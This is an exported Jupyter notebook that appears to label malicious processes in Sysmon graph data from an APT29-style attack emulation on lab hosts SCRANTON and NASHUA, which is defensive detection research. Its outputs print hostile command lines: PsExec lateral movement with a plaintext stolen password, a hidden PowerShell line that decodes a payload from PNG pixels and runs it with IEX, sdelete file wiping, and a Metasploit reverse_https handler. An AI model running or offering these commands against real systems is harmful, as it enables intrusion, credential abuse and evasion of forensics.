# 63799                                                                                                                                                                                        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RES2758.tmp" "c:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\CSC6B76613243A54474837EBEC19BC0E56A.TMP"
# 73611                                                                                                                                                                                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RESAB37.tmp" "c:\Users\pbeesly\AppData\Local\Temp\0piklvia\CSC8FB4597E15924B708420DCB4F6EA7BB.TMP"
# 88067                                                                                                                                                                                                                                                                                                                             \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c
# 104058                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 114981                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 115865                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 117807                                                                                                                                                                                                                                                                                                                                                                                               "C:\windows\system32\sdclt.exe"
# 136222                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 144331                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 147546                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 151329                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 154392                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 155466                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline"
# 157536                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\0piklvia\0piklvia.cmdline"
# 164294                                                                                                                                                                                                                                                                                                                            \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540
# 169200                                                                                                                                                                                                                                                                                                                                                                                                  C:\windows\system32\sdclt.exe
# 176379                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

# %%
descendants.add(malicious_root_ancestor)
df_bad_proc = df.loc[(df.NodeID.isin(descendants)) & (df['_node_type']=='Process')]
df_bad_proc.shape
# Out:
# (34, 21)

# %%
graph_bad_guids = []
for i in proc_nodes:
    graph_bad_guids.append(H.node[i]['properties']['process_guid'])
print(len(graph_bad_guids))
#print(graph_bad_guids)

label_bad_guids = df_label.loc[(df_label['TP_Binary'] == True) & (df_label.ProcessGuid.notnull())]['ProcessGuid'].unique()
pd_all_guids = df_label.loc[(df_label.ProcessGuid.notnull()) & (df_label.CommandLine.notnull())][['ProcessGuid', 'Hostname', 'TP_Binary', 'CommandLine']]
pd_all_guids['orig_label'] = False
pd_all_guids['orig_label'].loc[pd_all_guids.ProcessGuid.isin(label_bad_guids)] = True

pd_all_guids = pd_all_guids.drop(columns=['TP_Binary']).drop_duplicates()
pd_all_guids['graph_label'] = False
pd_all_guids['graph_label'].loc[pd_all_guids.ProcessGuid.isin(graph_bad_guids)] = True

with pd.option_context('display.max_rows', None, 'display.max_columns', None, 'display.max_colwidth', None):
    display(pd_all_guids[['ProcessGuid', 'Hostname', 'graph_label', 'CommandLine']].loc[((pd_all_guids.graph_label==True))])
# Out:
# 35
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)
#                                    ProcessGuid                Hostname  \
# 8974    {47ab858c-e342-5eac-d703-000000000400}  SCRANTON.dmevals.local
# 12975   {47ab858c-e374-5eac-d903-000000000400}  SCRANTON.dmevals.local
# 14768   {47ab858c-e23d-5eac-c603-000000000400}  SCRANTON.dmevals.local
# 26578   {47ab858c-e519-5eac-f403-000000000400}  SCRANTON.dmevals.local
# 38237   {47ab858c-e1e3-5eac-b503-000000000400}  SCRANTON.dmevals.local
# 39393   {47ab858c-e2f2-5eac-d203-000000000400}  SCRANTON.dmevals.local
# 60037   {47ab858c-e1f8-5eac-bc03-000000000400}  SCRANTON.dmevals.local
# 63799   {47ab858c-e1e5-5eac-bb03-000000000400}  SCRANTON.dmevals.local
# 68686   {47ab858c-e2ac-5eac-cb03-000000000400}  SCRANTON.dmevals.local
# 72642   {47ab858c-e18b-5eac-b103-000000000400}  SCRANTON.dmevals.local
# 73611   {47ab858c-e413-5eac-e903-000000000400}  SCRANTON.dmevals.local
# 88067   {47ab858c-e188-5eac-af03-000000000400}  SCRANTON.dmevals.local
# 96356   {47ab858c-e1e4-5eac-b803-000000000400}  SCRANTON.dmevals.local
# 104058  {47ab858c-e394-5eac-e303-000000000400}  SCRANTON.dmevals.local
# 113037  {47ab858c-e188-5eac-b003-000000000400}  SCRANTON.dmevals.local
# 114981  {47ab858c-e3d3-5eac-e603-000000000400}  SCRANTON.dmevals.local
# 115865  {47ab858c-e5a2-5eac-fb03-000000000400}  SCRANTON.dmevals.local
# 117807  {47ab858c-e1e2-5eac-b303-000000000400}  SCRANTON.dmevals.local
# 120642  {47ab858c-e144-5eac-ab03-000000000400}  SCRANTON.dmevals.local
# 130522  {47ab858c-e305-5eac-d303-000000000400}  SCRANTON.dmevals.local
# 136222  {47ab858c-e558-5eac-f503-000000000400}  SCRANTON.dmevals.local
# 139342  {47ab858c-e374-5eac-d803-000000000400}  SCRANTON.dmevals.local
# 144331  {47ab858c-e1e4-5eac-b903-000000000400}  SCRANTON.dmevals.local
# 147546  {47ab858c-e394-5eac-e203-000000000400}  SCRANTON.dmevals.local
# 151329  {47ab858c-e23d-5eac-c703-000000000400}  SCRANTON.dmevals.local
# 154392  {47ab858c-e4d6-5eac-f303-000000000400}  SCRANTON.dmevals.local
# 155466  {47ab858c-e1e5-5eac-ba03-000000000400}  SCRANTON.dmevals.local
# 157536  {47ab858c-e413-5eac-e803-000000000400}  SCRANTON.dmevals.local
# 160348  {47ab858c-e14e-5eac-ac03-000000000400}  SCRANTON.dmevals.local
# 164294  {47ab858c-e144-5eac-aa03-000000000400}  SCRANTON.dmevals.local
# 169200  {47ab858c-e1e2-5eac-b203-000000000400}  SCRANTON.dmevals.local
# 169201  {47ab858c-e1e3-5eac-b603-000000000400}  SCRANTON.dmevals.local
# 176379  {47ab858c-e3d3-5eac-e703-000000000400}  SCRANTON.dmevals.local
# 179251  {47ab858c-e13c-5eac-a903-000000000400}  SCRANTON.dmevals.local
#
#         graph_label  \
# 8974           True
# 12975          True
# 14768          True
# 26578          True
# 38237          True
# 39393          True
# 60037          True
# 63799          True
# 68686          True
# 72642          True
# 73611          True
# 88067          True
# 96356          True
# 104058         True
# 113037         True
# 114981         True
# 115865         True
# 117807         True
# 120642         True
# 130522         True
# 136222         True
# 139342         True
# 144331         True
# 147546         True
# 151329         True
# 154392         True
# 155466         True
# 157536         True
# 160348         True
# 164294         True
# 169200         True
# 169201         True
# 176379         True
# 179251         True
#
#                                                                                                                                                                                                                                                                                                                                                                                                                           CommandLine
# 8974                                                                                                                                                                                                                                                                                                                                                                               "C:\Program Files\SysinternalsSuite\accesschk.exe"
# 12975                                                                                                                                                                                                                                                                                                                                                                         \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 14768                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 26578                                                                                                                                                                                                                                                                                    "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 38237                                                                                                                                                                                                                                                                                                                                                                                                "C:\windows\system32\sdclt.exe"
# 39393                                                                                                                                                                                                                                                                                                                       "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
# 60037                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 63799                                                                                                                                                                                        C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RES2758.tmp" "c:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\CSC6B76613243A54474837EBEC19BC0E56A.TMP"
# 68686                                                                                                                                                                                                                                                                                                                           "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr
# 72642                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 73611                                                                                                                                                                                         C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\pbeesly\AppData\Local\Temp\RESAB37.tmp" "c:\Users\pbeesly\AppData\Local\Temp\0piklvia\CSC8FB4597E15924B708420DCB4F6EA7BB.TMP"
# 88067                                                                                                                                                                                                                                                                                                                             \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c
# 96356   "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
# 104058                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 113037                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 114981                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 115865                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 117807                                                                                                                                                                                                                                                                                                                                                                                               "C:\windows\system32\sdclt.exe"
# 120642                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 130522                                                                                                                                                                                                                                                                                                                "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip
# 136222                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 139342                                                                                                                                                                                                                                                                                                                                                                                                                 powershell.exe
# 144331                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 147546                                                                                                                                                                                                                                                                                                                                 "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
# 151329                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 154392                                                                                                                                                                                                                                                                                   "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe
# 155466                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline"
# 157536                                                                                                                                                                                                                                                                                "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\0piklvia\0piklvia.cmdline"
# 160348                                                                                                                                                                                                                                                                                                                                                                                                                     powershell
# 164294                                                                                                                                                                                                                                                                                                                            \\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x54c --server 0x540
# 169200                                                                                                                                                                                                                                                                                                                                                                                                  C:\windows\system32\sdclt.exe
# 169201                                                                                                                                                                                                                                                                                                                                                      "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
# 176379                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 179251                                                                                                                                                                                                                                                                                                                                                                                    "C:\ProgramData\victim\â€®cod.3aka3.scr" /S

# %% [markdown]
# ## Nashua Lateral Movement

# %% [raw]
# ==========================================
# Nashua LM:
# ==========================================
# Next, the attacker uploads a new UPX-packed payload (T1045) to the secondary victim.	"Start a new instance of Metasploit, and spawn a Metasploit handler:
#
# [msf] > handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https
#
# Return to current Meterpreter session:
#
# [meterpreter (PowerShell)\*] > Invoke-SeaDukeStage -ComputerName NASHUA"
# This new payload is executed on the secondary victim via the PSExec utility (T1077, T1035) using the previously stolen credentials (T1078).	"Execute SEADUKE Remotely via PSEXEC
#
# [meterpreter (PowerShell)\*] >
#
# .\PsExec64.exe -accepteula \\NASHUA -u ""dmevals\pbeesly"" -p ""Fl0nk3rt0n!T0by"" -i <Session Number from step 8.A. e.g. 4> ""C:\Windows\Temp\python.exe"""
# ==========================================
# Nashua LM Node Data:
# ==========================================
# {'properties': {'process_guid': '{5aa8ec29-e5b7-5eac-7603-000000000400}', 'host': 'NASHUA.dmevals.local', 'process_id': 1624, 'user': 'NT AUTHORITY\\SYSTEM', 'process_image': 'PSEXESVC.exe', 'process_image_path': 'C:\\Windows', 'command_line': 'C:\\windows\\PSEXESVC.exe', 'hashes': {'sha1': 'F1E36E0E34276A5015040780E14B58EFD1112B76', 'md5': 'AE5BB9F3FFF1AEAAAD619BAB105B2391', 'sha256': '224F549F33854ED53667055786DC1073E64B7428FAE26F27DAB9828ED502BB99', 'imphash': '09D5553D2AA2F39BDE811B88883DE7D5'}, 'process_path': 'C:\\Windows\\PSEXESVC.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'PSEXESVC.exe', '_color': '#FF0000'}

# %%
H, malicious_root_ancestor, ancestors, descendants, file_nodes, proc_nodes, ip_nodes = manual_recurse_pipeline(G, '{5aa8ec29-e5b7-5eac-7603-000000000400}')
# Out:
# ==========================================
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{5aa8ec29-cad7-5eac-0b00-000000000400}', 'host': 'NASHUA.dmevals.local', 'process_id': 720, 'user': None, 'process_image': 'services.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': None, 'hashes': {}, 'process_path': 'C:\\Windows\\System32\\services.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'services.exe', '_color': '#FF0000', 'Orig_Node_ID': 2819915667573983909}
# ==========================================
# Malicious? Enter yes or no:  no
# ##########################################
# Confirm this as the senior malicious node?
# ##########################################
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{5aa8ec29-e5b7-5eac-7603-000000000400}', 'host': 'NASHUA.dmevals.local', 'process_id': 1624, 'user': 'NT AUTHORITY\\SYSTEM', 'process_image': 'PSEXESVC.exe', 'process_image_path': 'C:\\Windows', 'command_line': 'C:\\windows\\PSEXESVC.exe', 'hashes': {'sha1': 'F1E36E0E34276A5015040780E14B58EFD1112B76', 'md5': 'AE5BB9F3FFF1AEAAAD619BAB105B2391', 'sha256': '224F549F33854ED53667055786DC1073E64B7428FAE26F27DAB9828ED502BB99', 'imphash': '09D5553D2AA2F39BDE811B88883DE7D5'}, 'process_path': 'C:\\Windows\\PSEXESVC.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'PSEXESVC.exe', '_color': '#FF0000', 'Orig_Node_ID': -3264818302931335331}
# ==========================================
# Edge Out Data:
# ==========================================
# Launched
# {'properties': {'process_guid': '{5aa8ec29-e5b7-5eac-7703-000000000400}', 'host': 'NASHUA.dmevals.local', 'process_id': 2952, 'user': nan, 'process_image': 'python.exe', 'process_image_path': 'C:\\Windows\\Temp', 'command_line': '"C:\\Windows\\Temp\\python.exe" ', 'hashes': {'sha1': '585EB59D12A111E9291518C5CF5D3FD296C2B581', 'md5': '57292CE8714E2D221D9D97C9D061D332', 'sha256': '43782EC4337D8F3DDB7EA0C451B3BC4F212F84C8D5571BD0A842001C859A02AE', 'imphash': '00000000000000000000000000000000'}, 'process_path': 'C:\\Windows\\Temp\\python.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'python.exe', '_color': '#FF0000', 'Orig_Node_ID': -7452327469794145490}
# ==========================================
# Malicious? Enter yes or no:  yes
# 156
# 156
# 39
# 3
# 43
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:579: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if not cb.iterable(width):
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/networkx/drawing/nx_pylab.py:676: MatplotlibDeprecationWarning:
# The iterable function was deprecated in Matplotlib 3.1 and will be removed in 3.3. Use np.iterable instead.
#   if cb.iterable(node_size):  # many node sizes
# Saving as: ancestor_descendants_156.png
# Saving as: ancestor_descendants_nodeType_156.png
# 11
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/pandas/core/indexing.py:671: SettingWithCopyWarning:
# A value is trying to be set on a copy of a slice from a DataFrame
#
# See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy
#   self._setitem_with_indexer(indexer, value)
#                                    ProcessGuid                Hostname  \
# 1334    {5aa8ec29-e655-5eac-8303-000000000400}    NASHUA.dmevals.local
# 18627   {5aa8ec29-e5b8-5eac-7903-000000000400}    NASHUA.dmevals.local
# 56194   {5aa8ec29-e5e4-5eac-7a03-000000000400}    NASHUA.dmevals.local
# 95348   {5aa8ec29-e624-5eac-7f03-000000000400}    NASHUA.dmevals.local
# 149429  {5aa8ec29-e603-5eac-7b03-000000000400}    NASHUA.dmevals.local
# 163244  {5aa8ec29-e618-5eac-7e03-000000000400}    NASHUA.dmevals.local
# 175284  {5aa8ec29-e5b7-5eac-7703-000000000400}    NASHUA.dmevals.local
# 180127  {5aa8ec29-e63e-5eac-8203-000000000400}    NASHUA.dmevals.local
# 8974    {47ab858c-e342-5eac-d703-000000000400}  SCRANTON.dmevals.local
# 14768   {47ab858c-e23d-5eac-c603-000000000400}  SCRANTON.dmevals.local
# 39393   {47ab858c-e2f2-5eac-d203-000000000400}  SCRANTON.dmevals.local
# 41375   {47ab858c-e442-5eac-ed03-000000000400}  SCRANTON.dmevals.local
# 60037   {47ab858c-e1f8-5eac-bc03-000000000400}  SCRANTON.dmevals.local
# 68686   {47ab858c-e2ac-5eac-cb03-000000000400}  SCRANTON.dmevals.local
# 72642   {47ab858c-e18b-5eac-b103-000000000400}  SCRANTON.dmevals.local
# 80262   {5aa8ec29-e52e-5eac-6b03-000000000400}    NASHUA.dmevals.local
# 83938   {47ab858c-e49f-5eac-f103-000000000400}  SCRANTON.dmevals.local
# 85882   {5aa8ec29-e56d-5eac-6e03-000000000400}    NASHUA.dmevals.local
# 96356   {47ab858c-e1e4-5eac-b803-000000000400}  SCRANTON.dmevals.local
# 113037  {47ab858c-e188-5eac-b003-000000000400}  SCRANTON.dmevals.local
# 120642  {47ab858c-e144-5eac-ab03-000000000400}  SCRANTON.dmevals.local
# 130522  {47ab858c-e305-5eac-d303-000000000400}  SCRANTON.dmevals.local
# 139342  {47ab858c-e374-5eac-d803-000000000400}  SCRANTON.dmevals.local
# 146429  {47ab858c-e49e-5eac-ef03-000000000400}  SCRANTON.dmevals.local
# 149428  {47ab858c-e49f-5eac-f003-000000000400}  SCRANTON.dmevals.local
# 152248  {47ab858c-e6b2-5eac-4d00-000000000500}  SCRANTON.dmevals.local
# 160348  {47ab858c-e14e-5eac-ac03-000000000400}  SCRANTON.dmevals.local
# 162243  {47ab858c-e442-5eac-ec03-000000000400}  SCRANTON.dmevals.local
# 169201  {47ab858c-e1e3-5eac-b603-000000000400}  SCRANTON.dmevals.local
# 179251  {47ab858c-e13c-5eac-a903-000000000400}  SCRANTON.dmevals.local
# 196722  {5aa8ec29-e4ec-5eac-6803-000000000400}    NASHUA.dmevals.local
# 139343  {5aa8ec29-e5b7-5eac-7803-000000000400}    NASHUA.dmevals.local
# 154393  {5aa8ec29-e5b7-5eac-7603-000000000400}    NASHUA.dmevals.local
#
#         orig_label  graph_label  \
# 1334          True         True
# 18627         True         True
# 56194         True         True
# 95348         True         True
# 149429        True         True
# 163244        True         True
# 175284        True         True
# 180127        True         True
# 8974          True        False
# 14768         True        False
# 39393         True        False
# 41375         True        False
# 60037         True        False
# 68686         True        False
# 72642         True        False
# 80262         True        False
# 83938         True        False
# 85882         True        False
# 96356         True        False
# 113037        True        False
# 120642        True        False
# 130522        True        False
# 139342        True        False
# 146429        True        False
# 149428        True        False
# 152248        True        False
# 160348        True        False
# 162243        True        False
# 169201        True        False
# 179251        True        False
# 196722        True        False
# 139343       False         True
# 154393       False         True
#
#                                                                                                                                                                                                                                                                                                                                                                                                                           CommandLine
# 1334                                                                                                                                                                                                                                                                                                                                                              .\sdelete64.exe  /accepteula "C:\Users\pbeesly\Desktop\working.zip"
# 18627                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 56194                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 95348                                                                                                                                                                                                                                                                                                                                                                          .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe"
# 149429                                                                                                                                                                                                                                                                                                      "C:\Windows\Temp\Rar.exe" a -hpfGzq5yKw C:\Users\pbeesly\Desktop\working.zip C:\Users\pbeesly\AppData\Roaming\working.zip
# 163244                                                                                                                                                                                                                                                                                                                                                                                                    C:\windows\system32\cmd.exe
# 175284                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 180127                                                                                                                                                                                                                                                                                                                                                   .\sdelete64.exe  /accepteula "C:\Users\pbeesly\AppData\Roaming\working.zip"
# 8974                                                                                                                                                                                                                                                                                                                                                                               "C:\Program Files\SysinternalsSuite\accesschk.exe"
# 14768                                                                                                                                                                                                                                                                                                                                                                                                                  powershell.exe
# 39393                                                                                                                                                                                                                                                                                                                       "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\AppData\Roaming\Draft.Zip
# 41375                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 60037                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 68686                                                                                                                                                                                                                                                                                                                           "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr
# 72642                                                                                                                                                                                                                                                                                                                                                                                                                      powershell
# 80262                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 83938                                                                                                                                                                                                                                                                                                                                 rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 85882                                                                                                                                                                                                                                                                                                                                                                                                   "C:\Windows\Temp\python.exe"
# 96356   "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
# 113037                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 120642                                                                                                                                                                                                                                                                                                                                                                                                  "C:\windows\system32\cmd.exe"
# 130522                                                                                                                                                                                                                                                                                                                "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\Users\pbeesly\Downloads\SysinternalsSuite.zip
# 139342                                                                                                                                                                                                                                                                                                                                                                                                                 powershell.exe
# 146429                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 149428                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 152248                                                                                                                                                                                                                                                                                                                                                                                              C:\Windows\System32\javamtsup.exe
# 160348                                                                                                                                                                                                                                                                                                                                                                                                                     powershell
# 162243                                                                                                                                                                                                                                                                                                                                rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav
# 169201                                                                                                                                                                                                                                                                                                                                                      "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
# 179251                                                                                                                                                                                                                                                                                                                                                                                    "C:\ProgramData\victim\â€®cod.3aka3.scr" /S
# 196722                                                                                                                                                                                                                                                                                                                                                                                                  "C:\Windows\Temp\python.exe"
# 139343                                                                                                                                                                                                                                                                                                                                                                        \??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1
# 154393                                                                                                                                                                                                                                                                                                                                                                                                        C:\windows\PSEXESVC.exe

# %%
descendants.add(malicious_root_ancestor)
df_bad_proc = df_bad_proc.append(df.loc[(df.NodeID.isin(descendants)) & (df['_node_type']=='Process')])
df_bad_proc.shape
# Out:
# (44, 21)

# %% [markdown]
# ## Scranton Persistence

# %% [raw]
# ==========================================
# Scranton Persistence:
# ==========================================
# The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the new service (T1035) and payload in the Windows Startup folder (T1060). 	"Reboot Windows SCRANTON; wait for system to boot up
#
# You should receive a callback with SYSTEM permissions from the javamtsup service"
# The payload in the Startup folder executes a follow-on payload using a stolen token (T1106, T1134). 	Trigger the Startup Folder persistence by logging in to Windows SCRANTON
#     javamtsup service: {47ab858c-e6b2-5eac-4d00-000000000500}
#     startup folder: 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\hostui.lnk'
#         NodeID: 659

# %%
H, malicious_root_ancestor, ancestors, descendants, file_nodes, proc_nodes, ip_nodes = manual_recurse_pipeline(G, '{47ab858c-e6b2-5eac-4d00-000000000500}')
# Out:
# ==========================================
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-e6ad-5eac-0b00-000000000500}', 'host': 'SCRANTON.dmevals.local', 'process_id': 736, 'user': nan, 'process_image': 'services.exe', 'process_image_path': 'C:\\windows\\system32', 'command_line': 'C:\\windows\\system32\\services.exe', 'hashes': {'sha1': '86662690D627002D7CAB3285F7BE3E6D87B35CFB', 'md5': 'BCCC12EB2EF644E662A63A023FB83F9B', 'sha256': '9090E0E44E14709FB09B23B98572E0E61C810189E2DE8F7156021BC81C3B1BB6', 'imphash': '1E2B4D983A0DE0DDBBD08123BBAC3200'}, 'process_path': 'C:\\windows\\system32\\services.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'services.exe', '_color': '#FF0000', 'Orig_Node_ID': 5034454925756666757}
# ==========================================
# Malicious? Enter yes or no:  no
# ##########################################
# Confirm this as the senior malicious node?
# ##########################################
# Node Data:
# ==========================================
# {'properties': {'process_guid': '{47ab858c-e6b2-5eac-4d00-000000000500}', 'host': 'SCRANTON.dmevals.local', 'process_id': 3296, 'user': 'NT AUTHORITY\\SYSTEM', 'process_image': 'javamtsup.exe', 'process_image_path': 'C:\\Windows\\System32', 'command_line': 'C:\\Windows\\System32\\javamtsup.exe', 'hashes': {'sha1': 'FF57080E5B19C3DCF62A00EA4037330F78B228CB', 'md5': '1B94BED747B7539280C9762C9C1B27EB', 'sha256': '8BE07818317849B36C2097E799DA9719471BA1D4DD9C60A97E31CA7CEDC6E992', 'imphash': 'A6D0283F95584F8785C65A050B4C2A6B'}, 'process_path': 'C:\\Windows\\System32\\javamtsup.exe'}, '_node_type': 'Process', '_node_class': 'SysMonProc', '_display': 'javamtsup.exe', '_color': '#FF0000', 'Orig_Node_ID': -3412322845721876550}
# ==========================================
# Edge Out Data:
# ==========================================
# Launched
